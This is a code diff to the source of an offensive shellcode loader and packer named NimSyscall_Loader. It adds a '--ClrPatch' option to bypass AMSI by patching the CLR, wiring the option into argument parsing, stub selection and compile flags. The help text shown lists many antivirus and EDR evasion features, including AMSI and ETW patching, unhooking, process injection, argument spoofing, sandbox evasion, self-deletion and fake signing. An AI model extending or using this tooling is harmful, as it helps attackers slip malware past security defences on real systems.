@@ -68,7 +68,7 @@ let helpmenu = """
 NimSyscall_Loader v 2.2
 
 Usage:
-  NimSyscall_Loader [--file=file_to_encrypt --key=<key> --keyfile=<keyFile> --dnsKey --dnsdomain=<sub.example.com> --environmentalKey=<domain,username> --killdate=<yyyymmdd> --output=<output> --large --metadata --shellcodeFile=<shellcodeFile> --shellcodeURL=<shellcodeURL> --dll --dllexportfunc=<exportfuncname> --execute-if=<procname> --dllhijack --perfectdllhijack --noNimMain --clone=<dllToClone> --dllProxy --payloadFunction=<functionName> --noRandom --mutexoneshot --cpl --xll --service --arguments=<Hardcoded_Arguments> --csharp --noAMSI --noETW --noOneShot --PatchAMSI --PatchETW --AMSIProviderPatch --AMSINtCreateSectionHook --sleep=<10> --sleep-in-between=<10> --shellcode --RWX --CallbackExecute --localCreateThread --QueueApc --noWait --COMVARETW --remoteinject --customprocess=<processname> --blockDLLs --spoofArgs=<ArgumentstoSpoof> --parentProcess=<parentName> --remoteprocess=<processnames> --remotepatchAMSI --remotepatchETW --mapSection --unhook=<dllname1,dllname2> --reflective --obfuscate --macPayload --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2> --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --verbose --noDInvoke --x86 --wow64 --llvm --sign --signdomain=<exampledomain> --noAntidebug --noDefaultSandBox --noAntiEmulate --sleepycrypt --fluctuate --interactivePS --psout --psobfs --pslyrics --csout --scout --sourceonly --jmpEntry --jmpEntryDLL=<example.dll> --jmpEntryFunc=<exampleFunc> --dripallocate --dripsleep=<sleeptime-ms> --stegofile=<filepath> --ruy-lopez --threadless --threadlessDll=<dllname.dll> --threadlessFunc=<dllfunc> --threadlessthread --poolparty=<number> --conhostinject --Caro-Kann --Caro-Kann-Thread --stomb --stombDll=<dllname.dll> --stombFunc=<dllfunc> --stombFunc2=<dllfunc2> --restore]
+  NimSyscall_Loader [--file=file_to_encrypt --key=<key> --keyfile=<keyFile> --dnsKey --dnsdomain=<sub.example.com> --environmentalKey=<domain,username> --killdate=<yyyymmdd> --output=<output> --large --metadata --shellcodeFile=<shellcodeFile> --shellcodeURL=<shellcodeURL> --dll --dllexportfunc=<exportfuncname> --execute-if=<procname> --dllhijack --perfectdllhijack --noNimMain --clone=<dllToClone> --dllProxy --payloadFunction=<functionName> --noRandom --mutexoneshot --cpl --xll --service --arguments=<Hardcoded_Arguments> --csharp --noAMSI --noETW --noOneShot --PatchAMSI --PatchETW --ClrPatch --AMSIProviderPatch --AMSINtCreateSectionHook --sleep=<10> --sleep-in-between=<10> --shellcode --RWX --CallbackExecute --localCreateThread --QueueApc --noWait --COMVARETW --remoteinject --customprocess=<processname> --blockDLLs --spoofArgs=<ArgumentstoSpoof> --parentProcess=<parentName> --remoteprocess=<processnames> --remotepatchAMSI --remotepatchETW --mapSection --unhook=<dllname1,dllname2> --reflective --obfuscate --macPayload --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2> --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --verbose --noDInvoke --x86 --wow64 --llvm --sign --signdomain=<exampledomain> --noAntidebug --noDefaultSandBox --noAntiEmulate --sleepycrypt --fluctuate --interactivePS --psout --psobfs --pslyrics --csout --scout --sourceonly --jmpEntry --jmpEntryDLL=<example.dll> --jmpEntryFunc=<exampleFunc> --dripallocate --dripsleep=<sleeptime-ms> --stegofile=<filepath> --ruy-lopez --threadless --threadlessDll=<dllname.dll> --threadlessFunc=<dllfunc> --threadlessthread --poolparty=<number> --conhostinject --Caro-Kann --Caro-Kann-Thread --stomb --stombDll=<dllname.dll> --stombFunc=<dllfunc> --stombFunc2=<dllfunc2> --restore]
   NimSyscall_Loader (-h | --help)
   NimSyscall_Loader --version
 
@@ -147,6 +147,7 @@ Options:
   --noOneShot    By default the Packer uses Hardware Breakpoints to bypass AMSI, but disables it after the payload has been executed. If you want to keep it enabled for the current Thread, use this option.
   --PatchAMSI    Bypass AMSI by patching an offset of amsi.dll/AmsiScanBuffer via Syscalls
   --PatchETW    Bypass ETW by patching ntdll.dll/NtTraceEvent via Syscalls
+  --ClrPatch    Patch the CLR to bypass AMSI
   --AMSIProviderPatch    Patch all AMSI Providers instead of 'amsi.dll' (https://i.blackhat.com/Asia-22/Friday-Materials/AS-22-Korkos-AMSI-and-Bypass.pdf)
   --AMSINtCreateSectionHook    Hook NtCreateSection to prevent 'amsi.dll' from being loaded (https://waawaa.github.io/es/amsi_bypass-hooking-NtCreateSection/)
   --sandbox value    Include Sandbox Checks of your choice into the loader:
@@ -310,6 +311,7 @@ var
     AMSI: bool = true
     oneShot: bool = true
     AMSIPatch: bool = false
+    ClrPatch: bool = false
     AMSIProviderPatch: bool = false
     AMSICreateSectionHook: bool = false
     ETW: bool = true
@@ -522,6 +524,11 @@ if args["--peload"]:
 if args["--PatchAMSI"]:
   AMSIPatch = true
   AMSI = false
+
+if args["--ClrPatch"]:
+  ClrPatch = true
+  AMSI = false
+  AMSIPatch = false
 
 if args["--PatchETW"]:
   ETWPatch = true
@@ -4224,6 +4231,8 @@ if (localinject):
         stub.add(AMSIStub)
     elif(AMSIPatch):
         stub.add(AMSIPatchStub)
+    elif(ClrPatch):
+        stub.add(ClrPatchStub)
     elif(AmsiProviderPatch):
         stub.add(AMSIProviderPatchStub)
     elif(AMSICreateSectionHook):
@@ -4634,6 +4643,9 @@ if(useStego):
 
 if(macPayload):
     basicCompileFlags.add("-d:macPayload ")
+
+if(ClrPatch):
+    basicCompileFlags.add("-d:ClrPatch ")
 
 # if dllNames contains clr.dll, add -d:unhookclr
 if (dllNames.contains("clr.dll")):
